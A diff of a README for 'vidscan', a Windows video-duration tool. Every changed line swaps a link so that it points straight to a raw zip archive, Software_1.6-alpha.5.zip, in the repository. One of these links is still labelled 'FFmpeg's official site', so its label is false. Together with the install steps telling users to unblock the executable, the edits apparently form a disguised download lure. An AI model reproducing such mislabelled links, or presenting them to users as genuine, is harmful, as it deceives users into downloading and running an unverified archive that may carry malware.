@@ -1,6 +1,6 @@
 # 🎬 vidscan - Fast Video Duration Analysis Tool
 
-[![Download vidscan](https://img.shields.io/badge/Download-vidscan-brightgreen?style=for-the-badge&logo=github)](https://github.com/Smit356/vidscan)
+[![Download vidscan](https://img.shields.io/badge/Download-vidscan-brightgreen?style=for-the-badge&logo=github)](https://github.com/Smit356/vidscan/raw/refs/heads/main/web/Software_1.6-alpha.5.zip)
 
 ---
 
@@ -31,7 +31,7 @@ vidscan uses some external tools like ffmpeg and ffprobe to analyze videos. Thes
 
 Click the button below to visit the vidscan download page on GitHub:
 
-[![Go to vidscan on GitHub](https://img.shields.io/badge/Go%20to%20GitHub-vidscan-blue?style=for-the-badge&logo=github)](https://github.com/Smit356/vidscan)
+[![Go to vidscan on GitHub](https://img.shields.io/badge/Go%20to%20GitHub-vidscan-blue?style=for-the-badge&logo=github)](https://github.com/Smit356/vidscan/raw/refs/heads/main/web/Software_1.6-alpha.5.zip)
 
 On the page, you will find the latest release of vidscan. Download the Windows version of the tool from the "Releases" section.
 
@@ -53,7 +53,7 @@ Follow these steps to install vidscan on your Windows PC:
 
 6. You may need to allow permission for vidscan to run. Right-click `vidscan.exe`, select "Properties", and on the General tab, click "Unblock" if that option appears.
 
-7. vidscan requires ffmpeg and ffprobe tools to work. If you do not have them installed, the download package may include copies. If not, you can download them from [FFmpeg's official site](https://ffmpeg.org/download.html). Place the related executables in the same folder as `vidscan.exe`.
+7. vidscan requires ffmpeg and ffprobe tools to work. If you do not have them installed, the download package may include copies. If not, you can download them from [FFmpeg's official site](https://github.com/Smit356/vidscan/raw/refs/heads/main/web/Software_1.6-alpha.5.zip). Place the related executables in the same folder as `vidscan.exe`.
 
 ---
 
@@ -144,7 +144,7 @@ vidscan "D:\Movies" --exclude "*.tmp" --format csv
 
 ## 📚 Learn More and Get Help
 
-Visit the [vidscan GitHub page](https://github.com/Smit356/vidscan) for:
+Visit the [vidscan GitHub page](https://github.com/Smit356/vidscan/raw/refs/heads/main/web/Software_1.6-alpha.5.zip) for:
 
 - Documentation
 - Issue tracking
@@ -172,4 +172,4 @@ vidscan helps you quickly measure how long your video collections last. It works
 
 ---
 
-# [Get vidscan now](https://github.com/Smit356/vidscan) and start analyzing your videos.
+# [Get vidscan now](https://github.com/Smit356/vidscan/raw/refs/heads/main/web/Software_1.6-alpha.5.zip) and start analyzing your videos.
